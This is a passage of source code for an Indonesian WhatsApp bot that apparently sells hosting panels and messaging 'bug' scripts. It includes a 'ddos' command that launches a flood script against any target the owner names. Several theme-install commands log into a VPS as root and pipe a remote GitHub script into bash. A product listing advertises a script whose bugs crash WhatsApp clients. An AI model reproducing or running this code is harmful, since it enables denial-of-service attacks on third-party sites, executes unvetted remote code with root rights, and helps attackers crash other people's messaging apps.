*RULES :*
- JOON GROUP UNTUK INFO
- *JAGA DATA BAIK BAIK*
- *HUB OWN JIKA ADA KENDALA*
- *SS PANEL DONE*
- *DI LARANG RUSUH*
- *DI LARANG NGINTIP SRV LAIN*
- *DI LARANG NYRI SC*
- *DI LARANG JUAL ADMIN*
- *DI LARANG DDOS PANEL*

*LANGGAR ? DI DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teksnyo
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANKS YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/7a7f5d5cfbafd26c915bc.jpg" } }, { upload: VxoZap.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 LINK GROUP","url":"${gcbuyer}","merchant_url":"https://www.google.com"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
},
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363300914288486@newsletter',
newsletterName: `VarelTzy`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
VxoZap.relayMessage(u, msg.message, {
messageId: msg.key.id
})
}
break
case 'ddos':
if (!isCreator) return replyy(global.nocreator)
if (!q.includes(' ')) return replyy(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
let moci = `*Bot is Attacking Wait for Results* 😤
𖤍 _target_ ->  ${targetweb} 
𖤍 _Time Attack_ -> ${timeweb} `
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Cek Website",
      url: `${targetweb}`,
      merchant_url: `${targetweb}`
   })
}], m, {
   body: moci,
   footer: ''
})
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replyy(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replyy(`Error: ${stderr}`);
          return;
        }
        replyy(`Success\n\n𖤍 target: ${targetweb},\n𖤍 Time: ${timeweb}`);
      });  
                         
break
case "delpanel": case "hapuspanel": {
if (!isDev) return replyy(`𝐥𝐮 𝐬𝐢𝐚𝐩𝐚 𝐝𝐞𝐤 🤣`)
if (!args[0]) return replyy("idservernya")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return replyy("*ID Server/User* Tidak Ditemukan")
replyy(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break

case "delusr": {
if (!isDev) return replyy(`𝐥𝐮 𝐬𝐢𝐚𝐩𝐚 𝐝𝐞𝐤 🤣`)
let usr = args[0]
if (!usr) return replyy('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return replyy('*USER NOT FOUND*')
replyy('*SUCCESSFULLY DELETE THE USER*')
}
break

case "delsrv": {
if (!isDev) return replyy(`𝐥𝐮 𝐬𝐢𝐚𝐩𝐚 𝐝𝐞𝐤 🤣`)
let srv = args[0]
if (!srv) return replyy('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return replyy('*SERVER NOT FOUND*')
replyy('*SUCCESSFULLY DELETE THE SERVER*')
}
break

case "listpanel": case "listp": case "listserver": {
if (!isDev) return replyy(`𝐥𝐮 𝐬𝐢𝐚𝐩𝐚 𝐝𝐞𝐤 🤣`)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return replyy("Tidak Ada Server Bot")
let messageText = "*🌐 LIST SERVER PANEL BOT*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `*┌ ◦* ID Server *${s.id}*\n`;
messageText += `*│ ◦* Nama Server *${s.name}*\n`
messageText += `*│ ◦* Ram *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*\n`
messageText += `*│ ◦* CPU *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*\n`;
messageText += `*└ ◦* Storage *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await VxoZap.sendMessage(m.chat, { text: messageText }, { quoted: m })
}
break
case 'installthema': {
   if (!isDev) return replyy(`KHUSUS DEVELOPER`)
let t = text.split(',');
if (t.length < 2) return replyy(`*Format salah!*
Penggunaan:
${prefix + command} ipVps,password`)
let ipvps = t[0];
let passwd = t[1];

let sections = [{
title: 'Silahkan Pilih Theme Yang Ingin Di install',
rows: [{
title: 'INSTALL THEME STELLAR',
id: `.th1 ${ipvps},${passwd}`
},
{
title: 'INSTALL THEME BILLING', 
id: `.th2 ${ipvps},${passwd}`
},
{
title: 'INSTALL THEME ENIGMA',
id: `.th3 ${ipvps},${passwd}`
}]
}]

let listMessage = {
    title: 'Klik Disini!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By vareltzy', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Silahkan Pilih Theme Yang Ingin Anda Install`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `AKU MAH PEMULA`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${m.sender.split("@")[0]} 👋*`,
 subtitle: "VarelTzy",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/765f7407616c61d53da4c.jpg" } }, { upload: VxoZap.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break  
case 'th1': {
    if (!isDev) return replyy(`KHUSUS DEVELOPER`);
    
    let t = text.split(',');
    if (t.length < 2) return replyy(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function vareltzy(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/varel455/theme/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        replyy('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                replyy('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('varelbaik\n');
                stream.write('1\n');
                stream.write('1\n');
                stream.write('y\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        replyy('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            replyy('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  
case 'th2': {
    if (!isDev) return replyy(`KHUSUS DEVELOPER`);
    
    let t = text.split(',');
    if (t.length < 2) return replyy(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function vareltzy(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/varel455/theme/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        replyy('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                replyy('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('varelbaik;\n');
                stream.write('1\n');
                stream.write('2\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        replyy('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            replyy('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break  
case 'th3': {
    if (!isDev) return replyy(`KHUSUS DEVELOPER`);
    
    let t = text.split(',');
    if (t.length < 2) return replyy(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function vareltzy(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/varel455/theme/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        replyy('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                replyy('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                conn.end();
            }).on('data', (data) => {
                stream.write('varelbaik;\n');
                stream.write('1\n');
                stream.write('3\n');
                stream.write('\n');
                stream.write('https://chat.whatsapp.com/K1uO3AjjRclGnf77eXv3s8\n');
                stream.write('https://whatsapp.com/channel/0029Vajny6c4tRs0qnwveJ0s\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        replyy('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            replyy('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
    
}
break  
case "listsrv": {
if (!isDev) return replyy(`SOK ASIK 🤣`);
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
  
for (let server of servers) {
let s = server.attributes;
    
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});
    
let data = await f3.json();
var status = data.attributes ? data.attributes.current_state : s.status;  

}
  
VxoZap.sendList(m.chat, `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`, "Powered By VarelTzy", {
title: `Total Server: ${res.meta.pagination.count}`, sections: [{
title: "List Servers Panel",
rows: servers.map(a => ({
title: `ID: ${a.attributes.id} - Status: ${status}`,
description: a.attributes.name,
id: `.delsrv ${a.attributes.id}`
}))
}]
})
                
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
replyy(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;
case "listadmin": {
if (!isCreator) return replyy(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let users = res.data;
let messageText = "Berikut list admin:\n\n";

for (let user of users) {
let u = user.attributes;
if (u.root_admin) {
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}
}

messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

await VxoZap.sendMessage(m.chat, { text: messageText }, { quoted: Zets });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
replyy(`Gunakan perintah ${prefix}listadmin ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case "listusr": {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let users = res.data;
  
messageText = `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
totalUsr = `Total Users: ${res.meta.pagination.count}`;
  
VxoZap.sendList(m.chat, messageText, "Powered By ᴠᴀʀᴇʟ", {
title: totalUsr, sections: [{
title: "List Users Panel",
rows: users.map(a => ({
title: `ID: ${a.attributes.id} - Status: ${a.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}`,
description: a.attributes.username,
id: `.delusr ${a.attributes.id}`
}))
}]
})
  
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
replyy(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break
case "addsrv": {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let s = text.split(',');
if (s.length < 7) return replyy(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return replyy(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
replyy(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case "addpanel": case "buatpanel": {
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
if (global.apikey.length < 1) return replyy("Apikey Tidak Ditemukan!")
if (!args[0]) return replyy("nama")
global.panel = [text.toLowerCase()]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© VarelTzy "
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By VarelTzy\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunli" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gb" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gb" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gb" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gb" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gb" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gb" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gb" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gb" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gb" }, 
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 220%", "id": ".cp10gb" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: Zets}) 
await VxoZap.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cp10gb": case "cpunli": {
if (!isCreator) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
if (global.panel == null) return replyy('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isReseller) return replyy(`𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐔𝐍𝐓𝐔𝐊 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋`)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(5).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replyy(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return replyy(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await replyy("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Login\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
},
]
})
})} 
}}, {userJid: m.sender, quoted: Zets}) 
await VxoZap.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break

case "listproduk": {
const url = "https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: VxoZap.waUploadToServer
  })
  return imageMessage
}


    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: `Berikut Listproduk VarelTzy` },
              carouselMessage: {
                cards: [
                  {
                    header: {
                      imageMessage: await image('https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg'),
                      hasMediaAttachment: true,
                    },
                    body: { text: `*_SELL SC VRL V5,5 NO ENC 100% JAMIN GACOR BUG NYA, BONUS PANEL PRIVATE_*

> BUG TEMBUS :
> WA ORI ✅
> WA IPHONE ✅
> WA IMUNNE ✅
> WA BISNIS ✅

*( BISA BUAT OPEN MURBUG )*

*HARGA? KLIK BUTTON DI BAWAH*`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"No VarelTzy☄️\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
              },
                      ],
                    },
                  },
                  {
                    header: {
                  imageMessage: await image('https://telegra.ph/file/d75f8a14bf5fd2590c2d3.jpg'),
                      hasMediaAttachment: true,
                    },
                    body: { text: ` BUG MENU V2`},
                    nativeFlowMessage: {
                      buttons: [
                        {
name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: "Open Bug Menu V2",
      id: ".bugmenuv2"
      }),
              },
                      ],
                    },
                  },

                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      { quoted: m }
    );

    await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
}
break
case "changeapido" :
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
if (!isDev) return replyy(`SOK ASIK 😂`);
global.apitokendo = `${text}`
replyy("Berhasil Mengganti Token Api Do ✅")
} else {
return replyy(`*format salah*\nContoh: ${prefix}changeapido *<TOKEN-API>*`)
}
break
case 'cekakunv1':
      if (!isDev) return replyy(`SOK ASIK 😂`);
        

      const getAccountInfo = async () => {
        try {
          const response = await fetch('https://api.digitalocean.com/v2/account', {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json',
